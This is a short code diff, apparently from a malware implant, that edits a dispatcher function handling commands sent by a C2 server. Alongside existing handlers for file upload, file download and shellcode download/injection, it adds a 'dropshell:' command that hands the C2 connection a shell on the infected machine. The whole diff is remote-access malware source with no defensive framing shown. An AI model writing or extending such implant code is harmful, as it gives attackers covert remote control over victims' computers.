@@ -3,6 +3,7 @@
 #include "uploadFile.h"
 #include "injectShellcode.h"
 #include "downloadShellcode.h"
+#include "dropIntoShell.h"
 #include <string>
 
 /* This function is responsible for figuring out what to do based off the data sent by the C2 (calling download, upload functions etc.) */
@@ -25,6 +26,9 @@ int makeDecision(char *recv, int recvlen, SOCKET ClientSocket) {
 	}
 	else if (strncmp(recv, "shellcode:", strlen("shellcode:")) == 0) {
 		downloadShellcode(ClientSocket);
+	}
+	else if (strncmp(recv, "dropshell:", strlen("dropshell:")) == 0) {
+		dropIntoShell(ClientSocket);
 	}
 	return 0;
 }
